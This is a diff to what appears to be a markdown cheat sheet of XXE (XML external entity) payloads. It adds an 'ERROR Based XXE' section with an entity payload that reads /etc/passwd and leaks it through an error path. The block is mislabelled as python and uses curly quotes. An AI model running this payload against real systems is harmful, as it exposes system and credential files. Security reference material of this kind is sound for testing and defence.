@@ -729,6 +729,17 @@ formatting.dtd:
 <specifications>&file;</specifications>
 
 ```
+
+## ERROR Based XXE
+
+```python
+
+	<!ENTITY % payload SYSTEM “file:///etc/passwd”>
+<!ENTITY % param1 ‘<!ENTITY % external SYSTEM “file:///nothere/%payload;”>’> %param1; %external;
+
+```
+
+
 ## BYPASS
 
 ###  Special Characters and Linefeed
